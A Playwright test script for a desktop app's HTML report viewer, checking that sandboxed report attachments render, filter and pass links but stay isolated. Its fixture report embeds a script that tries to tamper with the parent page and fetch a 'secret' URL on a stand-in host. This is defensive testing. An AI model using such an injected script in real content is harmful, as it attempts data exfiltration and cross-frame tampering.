import { chromium } from 'playwright';
import { readFile } from 'node:fs/promises';
import { createServer } from 'node:http';
import { createRequire } from 'node:module';
import assert from 'node:assert/strict';
const require = createRequire(import.meta.url);
const { JSDOM } = require('jsdom');
const { REPORT_CSP } = require('../electron/report-pages.cjs');
global.DOMParser = new JSDOM('').window.DOMParser;
const { safeHtmlDocument } = await import('../src/attachment-html.mjs');
const helper = (await readFile('apps/desktop/src/attachment-html.mjs','utf8')).replaceAll('export function','function');
const appHtml = await readFile('apps/desktop/index.html','utf8');
const appCsp = appHtml.match(/content="(default-src[^"]+)"/)[1];
let report = `<h1>Report</h1><div id="rows"></div><button onclick="document.querySelector('#rows').textContent='filtered'">Filter</button><a href="https://linear.app/test">Issue</a><script>document.querySelector('#rows').textContent='12 models';try{parent.document.body.dataset.leak='yes'}catch{};fetch('https://blocked.invalid/secret').catch(()=>{});</script>`;
const server = createServer((req,res)=>{
  if(req.url==='/report') {res.writeHead(200,{'Content-Type':'text/html','Content-Security-Policy':REPORT_CSP});res.end(safeHtmlDocument(report));}
  else if(req.url==='/helper.js'){res.writeHead(200,{'Content-Type':'text/javascript'});res.end(helper+`;window.links=[];addEventListener('message',e=>{const url=reportLink(e,document.querySelector('iframe').contentWindow);if(url)window.links.push(url)});`);}
  else {res.writeHead(200,{'Content-Type':'text/html','Content-Security-Policy':appCsp});res.end('<iframe sandbox="allow-scripts" src="/report"></iframe><script src="/helper.js"></script>');}
});
await new Promise(r=>server.listen(0,'127.0.0.1',r));
const browser = await chromium.launch({headless:true});
try {
  const page = await browser.newPage();
  await page.goto(`http://127.0.0.1:${server.address().port}`);
  const frame = page.frameLocator('iframe');
  await frame.getByText('12 models').waitFor();
  await frame.getByRole('button',{name:'Filter'}).click();
  assert.equal(await frame.locator('#rows').textContent(),'filtered');
  assert.equal(await page.evaluate(()=>document.body.dataset.leak),undefined);
  assert.equal(await frame.locator('body').evaluate(()=>typeof window.desktop),'undefined');
  await frame.getByRole('link',{name:'Issue'}).click();
  await page.waitForFunction(()=>window.links.length===1);
  assert.deepEqual(await page.evaluate(()=>window.links),['https://linear.app/test']);
  assert.equal(await frame.locator('h1').textContent(),'Report');
  if(process.env.REPORT_PATH){
    report=await readFile(process.env.REPORT_PATH,'utf8');
    await page.reload();
    await frame.locator('tbody tr').first().waitFor();
    console.log('Real report rows:',await frame.locator('tbody tr').count());
  }
  console.log('PASS production parent CSP, report data/filter/link, opaque parent and bridge isolation.');
} finally {await browser.close();await new Promise(r=>server.close(r))}
